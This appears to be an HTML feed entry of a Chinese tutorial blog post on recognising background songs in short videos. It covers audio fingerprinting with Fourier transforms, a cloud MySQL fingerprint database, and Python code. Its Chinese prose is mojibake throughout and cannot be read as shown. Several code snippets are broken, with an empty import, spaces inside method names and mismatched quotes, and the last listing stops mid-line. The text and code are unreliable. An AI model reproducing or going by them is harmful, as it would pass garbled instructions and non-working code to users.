    <content type="html"><![CDATA[<h1 id="å¬æ­Œè¯†æ›²"><a href="#å¬æ­Œè¯†æ›²" class="headerlink" title="å¬æ­Œè¯†æ›²"></a>å¬æ­Œè¯†æ›²</h1><p>æŠ–éŸ³å°è§†é¢‘èƒŒæ™¯éŸ³ä¹è¯†åˆ«</p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç°ä»£è¯­è¨€ç³»ä¸­è¯­éŸ³çš„ç‰¹å¾æ˜¯æŒ‡æè¿°è¯­éŸ³çš„æ ¸å¿ƒä¿¡æ¯ï¼Œè¿™åœ¨è¯­éŸ³æ¨¡å‹çš„æ„å»ºä¸­èµ·é‡è¦ä½œç”¨ã€‚äººç±»é€šè¿‡è€³æœµå¬åˆ°çš„ç‰¹æœ‰çš„é¢‘ç‡ç»„æˆçš„åºåˆ—æ¥è®°å¿†æ­Œæ›²ï¼Œé’ˆå¯¹äºçŸ­è§†é¢‘ä¸­çš„èƒŒæ™¯éŸ³ä¹ï¼Œé€šè¿‡å‚…é‡Œå¶å˜æ¢å°†å£°éŸ³è½¬æ¢ä¸ºé¢‘ç‡ï¼Œå¾—åˆ°ä¸€ä¸ªä¸ªæ•°ç»„ï¼Œå†ç”±æ•°ç»„ç»„åˆæˆå£°éŸ³æŒ‡çº¹ï¼Œä»è€Œè¿›è¡ŒéŸ³ä¹çš„è¯†åˆ«ã€‚</p><h1 id="1-èƒŒæ™¯æ­Œåè¯†åˆ«äº§ç”ŸèƒŒæ™¯"><a href="#1-èƒŒæ™¯æ­Œåè¯†åˆ«äº§ç”ŸèƒŒæ™¯" class="headerlink" title="1.èƒŒæ™¯æ­Œåè¯†åˆ«äº§ç”ŸèƒŒæ™¯"></a>1.èƒŒæ™¯æ­Œåè¯†åˆ«äº§ç”ŸèƒŒæ™¯</h1><h2 id="è§£å†³æ–¹æ¡ˆ-è¯­éŸ³å¤„ç†æŠ€æœ¯"><a href="#è§£å†³æ–¹æ¡ˆ-è¯­éŸ³å¤„ç†æŠ€æœ¯" class="headerlink" title="è§£å†³æ–¹æ¡ˆ-è¯­éŸ³å¤„ç†æŠ€æœ¯"></a>è§£å†³æ–¹æ¡ˆ-è¯­éŸ³å¤„ç†æŠ€æœ¯</h2><p>è¯­éŸ³ä¿¡å·å¤„ç†(Speech Signal Processing)ç®€ç§°è¯­éŸ³å¤„ç†ï¼Œæ˜¯ç”¨ä»¥ç ”ç©¶è¯­éŸ³å‘å£°è¿‡ç¨‹ã€è¯­éŸ³ä¿¡å·ç»Ÿè®¡ç‰¹æ€§ã€è¯­éŸ³è‡ªåŠ¨è¯†åˆ«ã€æœºå™¨åˆæˆä»¥åŠè¯­éŸ³æ„ŸçŸ¥ç­‰å„ç§å¤„ç†æŠ€æœ¯çš„æ€»ç§°ã€‚<br>ç”±äºç°ä»£çš„è¯­éŸ³å¤„ç†æŠ€æœ¯éƒ½ä»¥æ•°å­—è®¡ç®—ä¸ºåŸºç¡€ï¼Œå¹¶å€ŸåŠ©å¾®å¤„ç†å™¨ã€ä¿¡å·å¤„ç†å™¨æˆ–é€šç”¨è®¡ç®—æœºåŠ ä»¥å®ç°ï¼Œå› æ­¤ä¹Ÿç§°æ•°å­—è¯­éŸ³ä¿¡å·å¤„ç†ã€‚</p><h1 id="2-è¯­éŸ³å¤„ç†æŠ€æœ¯æ¦‚è¿°"><a href="#2-è¯­éŸ³å¤„ç†æŠ€æœ¯æ¦‚è¿°" class="headerlink" title="2.è¯­éŸ³å¤„ç†æŠ€æœ¯æ¦‚è¿°"></a>2.è¯­éŸ³å¤„ç†æŠ€æœ¯æ¦‚è¿°</h1><h2 id="ä»€ä¹ˆæ˜¯è¯­éŸ³å¤„ç†"><a href="#ä»€ä¹ˆæ˜¯è¯­éŸ³å¤„ç†" class="headerlink" title="ä»€ä¹ˆæ˜¯è¯­éŸ³å¤„ç†"></a>ä»€ä¹ˆæ˜¯è¯­éŸ³å¤„ç†</h2><p>è¯­éŸ³ä¿¡å·å¤„ç†çš„ç ”ç©¶èµ·æºäºå¯¹å‘éŸ³å™¨å®˜çš„æ¨¡æ‹Ÿã€‚<br>1939å¹´ç¾å›½H.æœå¾·è±(H.Dudley)å±•å‡ºäº†ä¸€ä¸ªç®€å•çš„å‘éŸ³è¿‡ç¨‹æ¨¡æ‹Ÿç³»ç»Ÿï¼Œä»¥åå‘å±•ä¸ºå£°é“çš„æ•°å­—æ¨¡å‹ã€‚åˆ©ç”¨è¯¥æ¨¡å‹å¯ä»¥å¯¹è¯­éŸ³ä¿¡å·è¿›è¡Œå„ç§é¢‘è°±åŠå‚æ•°çš„åˆ†æï¼Œè¿›è¡Œé€šä¿¡ç¼–ç æˆ–æ•°æ®å‹ç¼©çš„ç ”ç©¶ï¼ŒåŒæ—¶ä¹Ÿå¯åŸºäºæ­¤åˆæˆè¯­éŸ³ä¿¡å·ï¼Œå®ç°æœºå™¨çš„è¯­éŸ³åˆæˆã€‚<br>è¯­è¨€ä¿¡æ¯ä¸»è¦åŒ…å«åœ¨è¯­éŸ³ä¿¡å·çš„å‚æ•°ä¹‹ä¸­ï¼Œå› æ­¤å‡†ç¡®è€Œè¿…é€Ÿåœ°æå–è¯­è¨€ä¿¡å·çš„å‚æ•°æ˜¯è¿›è¡Œè¯­éŸ³ä¿¡å·å¤„ç†çš„å…³é”®ã€‚</p><h2 id="è¯­éŸ³å¤„ç†-å£°çº¹è¯†åˆ«"><a href="#è¯­éŸ³å¤„ç†-å£°çº¹è¯†åˆ«" class="headerlink" title="è¯­éŸ³å¤„ç†-å£°çº¹è¯†åˆ«"></a>è¯­éŸ³å¤„ç†-å£°çº¹è¯†åˆ«</h2><p>å£°çº¹(Voiceprint)ï¼Œä¹Ÿå¯ç§°ä½œè¯´è¯äººè¯†åˆ«ï¼Œæ˜¯ä¸€ç§é€šè¿‡å£°éŸ³åˆ¤åˆ«è¯´è¯äººèº«ä»½çš„æŠ€æœ¯ï¼Œå£°çº¹æ˜¯æºå¸¦è¨€è¯­ä¿¡æ¯çš„å£°æ³¢é¢‘è°±ï¼Œç”±æ³¢é•¿ã€é¢‘ç‡ä»¥åŠå¼ºåº¦ç­‰å¤šç§ç‰¹å¾ç»´åº¦ç»„æˆçš„ç”Ÿç‰©ç‰¹å¾ï¼Œæœ‰ç¨³å®šæ€§ï¼Œå¯æµ‹é‡æ€§ä»¥åŠå”¯ä¸€æ€§ç­‰ä¼˜ç‚¹ã€‚ä¸åŒçš„äººè¯´è¯æ‰€äº§ç”Ÿçš„å£°çº¹å›¾è°±æ˜¯å­˜åœ¨å·®å¼‚çš„ï¼Œé€šè¿‡å¯¹æ¯”å·®å¼‚å°±å¯å®ç°å£°çº¹è¯†åˆ«çš„åŠŸèƒ½ã€‚</p><h2 id="å£°çº¹è¯†åˆ«ç‰¹å¾"><a href="#å£°çº¹è¯†åˆ«ç‰¹å¾" class="headerlink" title="å£°çº¹è¯†åˆ«ç‰¹å¾"></a>å£°çº¹è¯†åˆ«ç‰¹å¾</h2><p><strong>å…±é¸£æ–¹å¼ç‰¹å¾</strong><br>å’½è…”å…±é¸£ã€é¼»è…”å…±é¸£å’Œå£è…”å…±é¸£</p><p><strong>å—“éŸ³çº¯åº¦ç‰¹å¾</strong><br>ä¸åŒäººçš„å™ªéŸ³ï¼Œçº¯åº¦ä¸€èˆ¬æ˜¯ä¸ä¸€æ ·çš„ï¼Œå¤§è‡´å¯åˆ†ä¸ºé«˜çº¯åº¦(æ˜äº®)ã€ä½çº¯åº¦(æ²™å“‘)å’Œä¸­ç­‰çº¯åº¦ä¸‰ä¸ªç­‰çº§</p><p><strong>å¹³å‡éŸ³é«˜ç‰¹å¾</strong><br>å¹³å‡éŸ³é«˜çš„é«˜ä½:å—“éŸ³é«˜äº¢è¿˜æ˜¯ä½æ²‰</p><p><strong>éŸ³åŸŸç‰¹å¾</strong><br>éŸ³åŸŸçš„é«˜ä½:å£°éŸ³é¥±æ»¡è¿˜æ˜¯å¹²ç˜ª</p><h2 id="å£°çº¹è¯†åˆ«æµç¨‹"><a href="#å£°çº¹è¯†åˆ«æµç¨‹" class="headerlink" title="å£°çº¹è¯†åˆ«æµç¨‹"></a>å£°çº¹è¯†åˆ«æµç¨‹</h2><p>å£°çº¹è¯†åˆ«ä½œä¸ºç”Ÿç‰©è¯†åˆ«çš„ä¸€ç§ï¼Œä¹Ÿå¯ç§°ä¸ºè¯´è¯äººè¯†åˆ«ï¼Œä»è¯´è¯äººå‘å‡ºçš„è¯­éŸ³ä¿¡å·ä¸­æå–å£°çº¹ç‰¹å¾ä¿¡æ¯ã€‚é€šå¸¸å…·æœ‰ä¸¤ä¸ªé˜¶æ®µï¼Œå³å£°éŸ³æ³¨å†Œå’Œå£°éŸ³éªŒè¯ã€‚</p><p>å£°çº¹æ³¨å†Œ-&gt;æœ‰æ•ˆè¯­éŸ³æå–-&gt;æå–ç‰¹å¾-&gt;å£°çº¹æ•°æ®åº“<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;â†‘ &emsp;&emsp;&emsp;â”‚<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;æå–ç®—æ³•&emsp;å¯¹æ¯”ç®—æ³•<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; &emsp;â†“ &emsp;&emsp;&emsp;â†“<br>å£°çº¹éªŒè¯-&gt;æœ‰æ•ˆè¯­éŸ³æå–-&gt;æå–ç‰¹å¾-&gt;ç‰¹å¾å¯¹æ¯”-&gt;è¯†åˆ«ç»“æœ</p><h1 id="3-èƒŒæ™¯æ­Œåè¯†åˆ«æ‰€æ¶‰åŠç›¸å…³æŠ€æœ¯"><a href="#3-èƒŒæ™¯æ­Œåè¯†åˆ«æ‰€æ¶‰åŠç›¸å…³æŠ€æœ¯" class="headerlink" title="3.èƒŒæ™¯æ­Œåè¯†åˆ«æ‰€æ¶‰åŠç›¸å…³æŠ€æœ¯"></a>3.èƒŒæ™¯æ­Œåè¯†åˆ«æ‰€æ¶‰åŠç›¸å…³æŠ€æœ¯</h1><h2 id="ç‰¹å¾æå–"><a href="#ç‰¹å¾æå–" class="headerlink" title="ç‰¹å¾æå–"></a>ç‰¹å¾æå–</h2><p>å£°çº¹è¯†åˆ«ä¸­é‡è¦çš„ä¸€æ­¥ä¸ºç‰¹å¾æå–ï¼Œå³è¯†åˆ«éŸ³é¢‘ä¿¡å·ï¼Œè·å–æ‰€éœ€è¯­éŸ³ä¿¡æ¯</p><h3 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h3><h4 id="1-è¯­éŸ³ä¿¡å·åˆ†å¸§"><a href="#1-è¯­éŸ³ä¿¡å·åˆ†å¸§" class="headerlink" title="1.è¯­éŸ³ä¿¡å·åˆ†å¸§"></a>1.è¯­éŸ³ä¿¡å·åˆ†å¸§</h4><p>éŸ³é¢‘ä¿¡å·ä¸æ–­å˜åŒ–ï¼Œä¸ºäº†ç®€åŒ–å¤„ç†æ­¥éª¤ï¼Œå°†éŸ³é¢‘ä¿¡å·åˆ†å¸§å¤„ç†(å¸¸åˆ†ä¸º20~40mså¸§)ç¡®ä¿æ¯å¸§çš„éŸ³é¢‘ä¿¡å·å˜åŒ–ç¨³å®š</p><h4 id="2-å¯¹æ¯å¸§åšå‚…é‡Œå¶å˜æ¢"><a href="#2-å¯¹æ¯å¸§åšå‚…é‡Œå¶å˜æ¢" class="headerlink" title="2.å¯¹æ¯å¸§åšå‚…é‡Œå¶å˜æ¢"></a>2.å¯¹æ¯å¸§åšå‚…é‡Œå¶å˜æ¢</h4><p>å‚…é‡Œå¶å˜æ¢é€‚ç”¨äºåˆ†å¿ƒå¹³ç¨³çš„éŸ³é¢‘ä¿¡å·ï¼Œå‚…é‡Œå¶å˜æ¢å¯¹é’ˆå¯¹æ¯ä¸€å¸§éŸ³é¢‘ä¿¡å·è¿›è¡Œå¤„ç†ï¼Œåªè®°å½•ä¸æ¥è¿‘äºé›¶çš„é¢‘åŸŸä¿¡æ¯ï¼Œä»è€Œå‡å°‘æ•°æ®é‡</p><p><strong>æ—¶åŸŸ</strong><br>æè¿°æ•°å­¦å‡½æ•°æˆ–ç‰©ç†ä¿¡å·å¯¹æ—¶é—´çš„å…³ç³»ï¼Œé€šå¸¸å‘ˆç°ä¸ºæ³¢å½¢<br><strong>é¢‘åŸŸ</strong><br>åœ¨å¯¹å‡½æ•°æˆ–ä¿¡å·è¿›è¡Œåˆ†ææ—¶ï¼Œåˆ†æå…¶å’Œé¢‘ç‡æœ‰å…³çš„éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯å’Œæ—¶é—´çš„æœ‰å…³éƒ¨åˆ†ï¼Œä¸æ—¶åŸŸç›¸å¯¹ï¼Œé€šå¸¸å‘ˆç°ä¸ºé¢‘è°±</p><h2 id="å‚…é‡Œå¶å˜æ¢"><a href="#å‚…é‡Œå¶å˜æ¢" class="headerlink" title="å‚…é‡Œå¶å˜æ¢"></a>å‚…é‡Œå¶å˜æ¢</h2><p>å‚…é‡Œå¶å˜æ¢:ä½œä¸ºä¸€ç§çº¿æ€§ç§¯åˆ†å˜æ¢ï¼Œå¯ç”¨äºéŸ³é¢‘ä¿¡å·åœ¨æ—¶åŸŸå’Œé¢‘åŸŸä¹‹é—´çš„è½¬æ¢ã€‚å…¶å®è´¨ä¸º:å°†æ—¶åŸŸä¿¡å·å˜æ¢ä¸ºé¢‘åŸŸä¿¡å·ï¼Œå°†ç¹æ‚çš„æ•°æ®ç®€åŒ–ï¼Œä»…éœ€è¦å¯¹å°‘éƒ¨åˆ†æ•°æ®è¿›è¡Œå¤„ç†ã€‚(ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åœ¨å¯¹ä¿¡å·åšå‚…é‡Œå¶å˜æ¢æ—¶ï¼Œåªéœ€è¦è®°å½•å…¶ä¸­ä¸æ¥è¿‘é›¶çš„é¢‘åŸŸä¿¡æ¯å³å¯ï¼Œè¿™æ ·åšå°±ä½¿å¾—æ•°æ®é‡å¤§å¤§å‡å°‘)<br>é’ˆå¯¹éŸ³é¢‘æ•°æ®è¿›è¡Œå‚…é‡Œå¶å˜æ¢åï¼Œå¯¹æ•°æ®è¿›è¡Œæ±‚æ¨¡ï¼Œå¾—åˆ°å¤šç»„æ•°ç»„ï¼Œå¯¹æ•°ç»„è¿›è¡Œæ•´åˆ(ä¾‹:å°†å››ä¸ªæ•°ç»„ä¸­æ¨¡é•¿æœ€é•¿çš„ä¸‹æ ‡è¿›è¡Œåˆå¹¶ï¼Œåˆæˆä¸€ä¸ªå››å…ƒç»„)ï¼Œä»è€Œè·å¾—æ ¸å¿ƒçš„éŸ³é¢‘â€œæŒ‡çº¹â€ã€‚</p><p>åŒ¹é…å£°çº¹æ•°æ®åº“<br>åœ¨å¯¹å£°éŸ³è¿›è¡Œæ³¨å†Œåï¼Œé€šè¿‡æå–è¯­éŸ³ç‰¹å¾ï¼Œè·å¾—å£°çº¹å¯¼å…¥æ•°æ®åº“ä¸­å»ºç«‹å¯¹åº”çš„å£°çº¹æ•°æ®åº“å½“è·å–åˆ°è¯­éŸ³æ–‡ä»¶ä¹‹åï¼Œé€šè¿‡é¢„å¤„ç†è·å–åˆ°è¯­éŸ³ç‰¹å¾ï¼Œç»è¿‡ä¸å£°çº¹æ•°æ®è¿›è¡Œç‰¹å¾å¯¹æ¯”ï¼Œä»è€Œå¾—åˆ°æœ€ä½³çš„è¯†åˆ«ç»“æœã€‚</p><h2 id="å£°çº¹è¯†åˆ«åº”ç”¨"><a href="#å£°çº¹è¯†åˆ«åº”ç”¨" class="headerlink" title="å£°çº¹è¯†åˆ«åº”ç”¨"></a>å£°çº¹è¯†åˆ«åº”ç”¨</h2><p><strong>å®‰é˜²</strong><br>ä½œä¸ºç”Ÿç‰©ç‰¹å¾è¯†åˆ«æŠ€æœ¯ï¼Œå¯ä»¥ç”¨äºåˆ‘ä¾¦ã€é‰´å®šè¯†åˆ«ç­‰é¢†åŸŸ<br><strong>é‡‘è</strong><br>é€šè¿‡å£°çº¹æŠ€æœ¯æä¾›ç”¨æˆ·æ³¨å†Œã€ç”¨æˆ·éªŒè¯ç­‰åŠŸèƒ½<br><strong>ç¤¾ä¿</strong><br>é€šè¿‡å£°çº¹æŠ€æœ¯å¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½è®¤è¯ï¼Œç¡®ä¿å‚ä¿äººå‘˜ç”Ÿå­˜çŠ¶å†µ<br><strong>æ™ºèƒ½ç¡¬ä»¶</strong><br>é€šè¿‡å£°çº¹è¯†åˆ«æŠ€æœ¯ï¼Œå®ç°â€œå¬å£°è¯†äººâ€ï¼Œè®©æ™ºèƒ½ç¡¬ä»¶èƒ½å¤ŸåŒºåˆ†ä¸åŒçš„è§’è‰²</p><h1 id="4-èƒŒæ™¯æ­Œåè¯†åˆ«å®è·µ"><a href="#4-èƒŒæ™¯æ­Œåè¯†åˆ«å®è·µ" class="headerlink" title="4. èƒŒæ™¯æ­Œåè¯†åˆ«å®è·µ"></a>4. èƒŒæ™¯æ­Œåè¯†åˆ«å®è·µ</h1><h2 id="æ­Œåè¯†åˆ«-æ¶æ„"><a href="#æ­Œåè¯†åˆ«-æ¶æ„" class="headerlink" title="æ­Œåè¯†åˆ« æ¶æ„"></a>æ­Œåè¯†åˆ« æ¶æ„</h2><p>python + äº‘æ•°æ®åº“RDS</p><h2 id="py3"><a href="#py3" class="headerlink" title="py3"></a>py3</h2><p>Pymysql (py2 mysqldb)<br>Moviepy è½¬éŸ³é¢‘<br>PyAudio è¯­éŸ³æ“ä½œ</p><h2 id="å…³ç³»å‹æ•°æ®åº“"><a href="#å…³ç³»å‹æ•°æ®åº“" class="headerlink" title="å…³ç³»å‹æ•°æ®åº“"></a>å…³ç³»å‹æ•°æ®åº“</h2><p>ç³»å‹æ•°æ®åº“(Relational Database Serviceï¼Œç®€ç§°RDS)æ˜¯ä¸€ç§åŸºäºäº‘è®¡ç®—å¹³å°çš„å³å¼€å³ç”¨ã€ç¨³å®šå¯é ã€å¼¹æ€§ä¼¸ç¼©ã€ä¾¿æ·ç®¡ç†çš„åœ¨çº¿å…³ç³»å‹æ•°æ®åº“æœåŠ¡ã€‚</p><p>äº‘å…³ç³»å‹æ•°æ®åº“å¯æ”¯æŒä»¥ä¸‹å‡ ç±»æ•°æ®åº“å¼•æ“:<br>MySQLï¼ŒPostgreSQLï¼ŒSQL Serverï¼ŒGaussDB(openGauss)<br>ç‰¹ç‚¹ä¼˜åŠ¿</p><p>å¼€ç®±å³ç”¨ï¼ŒæŒ‰éœ€ä»˜è´¹ï¼Œå¯è§†ç®¡ç†ï¼Œå¼¹æ€§ä¼¸ç¼©</p><h2 id="å»ºç«‹å£°çº¹æ•°æ®åº“"><a href="#å»ºç«‹å£°çº¹æ•°æ®åº“" class="headerlink" title="å»ºç«‹å£°çº¹æ•°æ®åº“"></a>å»ºç«‹å£°çº¹æ•°æ®åº“</h2><p>å­˜å‚¨æµ·é‡å£°çº¹æ•°æ®ï¼Œå»ºç«‹å£°çº¹æ•°æ®åº“é€šè¿‡ä¸Pythonè¿æ¥ï¼Œåœ¨Pythoné€šè¿‡ç»„ä»¶åŠä»£ç è·å–åˆ°å¯ç”¨äºå­˜å‚¨çš„å£°çº¹ç‰¹å¾ä¹‹åï¼Œå­˜å…¥æ•°æ®åº“RDSå¯¹åº”æ–°å»ºåº“singdbä¸­</p><p>ä½œä¸ºå£°çº¹æ•°æ®åº“ï¼Œè¿›è¡Œå£°çº¹ç‰¹å¾åŒ¹é…ï¼Œ<br>ä»è€Œå®ç°æ­Œåè¯†åˆ«åœ¨Pythonè·å–åˆ°ç”¨æˆ·æ‰€éœ€å¯¹æ¯”è¯†åˆ«çš„çŸ­è§†é¢‘åï¼Œé€šè¿‡æå–å¯¹åº”å£°çº¹ç‰¹å¾ï¼Œä¸å£°çº¹æ•°æ®åº“ä¸­çš„å£°çº¹ç‰¹å¾è¿›è¡Œå¯¹æ¯”ï¼Œä»è€Œè·å–åˆ°å¯¹åº”çš„æ­Œæ›²åç§°ï¼Œå®ç°èƒŒæ™¯æ­Œåè¯†åˆ«</p><h2 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h2><p>é…ç½®æ•°æ®åº“-&gt;å®‰è£…py-anacondaä¸‹è½½ç»„ä»¶-&gt;å…³è”æ•°æ®åº“å’Œpy-&gt;éªŒè¯ç»“æœ</p><p>æ–°å»ºæ•°æ®åº“<br>singdb<br>utf8mb4</p><p>song_name varchar200<br>fq longtext</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pymysql</span><br><span class="line">pip install -user moviepy -i http://pypi.douban.com/simple --trusted-host=pypi.douban.com</span><br></pre></td></tr></table></figure><h3 id="è§†é¢‘è½¬éŸ³é¢‘"><a href="#è§†é¢‘è½¬éŸ³é¢‘" class="headerlink" title="è§†é¢‘è½¬éŸ³é¢‘"></a>è§†é¢‘è½¬éŸ³é¢‘</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> moviepy.editor <span class="keyword">import</span></span><br><span class="line">video=VideoFileClip(<span class="string">&#x27;ç¤ºä¾‹1.mp4&#x27;</span>)</span><br><span class="line">audio = video.audio</span><br><span class="line">audio.write audiofile(<span class="string">&#x27;ç¤ºä¾‹1.wav&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="éªŒè¯ç»“æœ"><a href="#éªŒè¯ç»“æœ" class="headerlink" title="éªŒè¯ç»“æœ"></a>éªŒè¯ç»“æœ</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sss=memory(<span class="string">&quot;å¼¹æ€§å…¬ç½‘IP&#x27;,3306,&#x27;root&quot;</span>,<span class="string">&#x27;è‡ªè¡Œè®¾ç½®çš„å¯†ç â€™,&#x27;</span>singd<span class="string">b&#x27;)</span></span><br><span class="line"><span class="string">res=sss.search and play(&#x27;</span>ç¤ºä¾‹<span class="number">1.</span>wav<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">score=max(res)</span></span><br><span class="line"><span class="string">if score[0]&lt;1000:</span></span><br><span class="line"><span class="string">print(â€œæ²¡æœ‰æ‰¾åˆ°&quot;â€)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">print(&quot;æ­Œæ›²åç§°:&quot;,score[1])</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡Pythonçš„ç›¸å…³ä»£ç å¯¹çŸ­è§†é¢‘è¿›è¡Œè§†éŸ³åˆ†ç¦»å¹¶å»ºç«‹å£°éŸ³<strong>æŒ‡çº¹</strong>æ•°æ®åº“ï¼Œé€šè¿‡çŸ­è§†é¢‘èƒŒæ™¯éŸ³ä¹ä¸å£°å­¦æ¨¡å‹è¿›è¡ŒåŒ¹é…ï¼Œä»è€Œè·å–åˆ°èƒŒæ™¯æ­Œåã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¯­éŸ³å¤„ç†çš„åŸºç¡€çŸ¥è¯†åŠåº”ç”¨<br>è¯­éŸ³å¤„ç†çš„åŸºæœ¬æ­¥éª¤<br>ç†Ÿæ‚‰å£°çº¹è¯†åˆ«çš„éƒ¨ç½²æ–¹å¼åŠæ•´ä½“æµç¨‹</p><h1 id="ä¹ é¢˜"><a href="#ä¹ é¢˜" class="headerlink" title="ä¹ é¢˜"></a>ä¹ é¢˜</h1><p>Pythonéœ€é€šè¿‡å¼¹æ€§å…¬ç½‘IPä¸äº‘æ•°æ®åº“RDSè¿›è¡Œè¿æ¥ã€‚<br>ture<br>å£°çº¹è¯†åˆ«<br>ç¨³å®šæ€§ å¯æµ‹é‡æ€§ å”¯ä¸€æ€§<br>ç‰¹å¾æå–<br>å¯¹éŸ³é¢‘ä¿¡å·åšåˆ†å¸§å¤„ç†<br>20~40mså¸§</p><h1 id="test"><a href="#test" class="headerlink" title="test"></a>test</h1><p>æ•°æ®åº“åç§°ï¼šsingdbï¼ˆå¯è‡ªå®šä¹‰ï¼‰å­—ç¬¦é›†ï¼šutf8mb4<br>è¡¨åï¼šfingerprintï¼ˆå¯è‡ªå®šä¹‰ï¼‰å­˜å‚¨å¼•æ“ï¼šInnoDBå­—ç¬¦é›†ï¼šutf8mb4æ ¡éªŒè§„åˆ™ï¼šutf8mb4_general_ci</p><p>Pycharm<br>æå–éœ€å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ä¾›æ£€ç´¢è¯†åˆ«çš„éŸ³é¢‘æ–‡ä»¶çš„ç‰¹å¾ä¿¡æ¯ï¼ˆéŸ³é¢‘å¤„ç†çš„ç±»æœ‰ä¸‰ç§æ–¹æ³•ï¼šè½½å…¥æ•°æ®ã€å‚…é‡Œå¶å˜æ¢ã€æ’­æ”¾éŸ³ä¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pyaudio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">voice</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loaddata</span>(<span class="params">self, filepath</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(filepath) != <span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError</span><br><span class="line">        p1 = re.<span class="built_in">compile</span>(<span class="string">&#x27;\.wav&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> p1.findall(filepath) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> IOError</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = wave.<span class="built_in">open</span>(filepath, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">            params = f.getparams()</span><br><span class="line">            self.nchannels, self.sampwidth, self.framerate, self.nframes = params[:<span class="number">4</span>]</span><br><span class="line">            str_data = f.readframes(self.nframes)</span><br><span class="line">            <span class="comment">#self.wave_data = np.fromstring(str_data, dtype=np.short)</span></span><br><span class="line">            self.wave_data = np.frombuffer(str_data, dtype=np.short)</span><br><span class="line">            self.wave_data.shape = -<span class="number">1</span>, self.sampwidth</span><br><span class="line">            self.wave_data = self.wave_data.T</span><br><span class="line">            f.close()</span><br><span class="line">            self.name = os.path.basename(filepath)  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">raise</span> IOError</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fft</span>(<span class="params">self, frames=<span class="number">40</span></span>):</span><br><span class="line">        block = []</span><br><span class="line">        fft_blocks = []</span><br><span class="line">        self.high_point = []</span><br><span class="line">        blocks_size = self.framerate // frames  </span><br><span class="line">        blocks_num = self.nframes / blocks_size  </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(self.wave_data[<span class="number">0</span>]) - blocks_size, blocks_size):</span><br><span class="line">            block.append(self.wave_data[<span class="number">0</span>][i:i + blocks_size])</span><br><span class="line">            fft_blocks.append(np.<span class="built_in">abs</span>(np.fft.fft(self.wave_data[<span class="number">0</span>][i:i 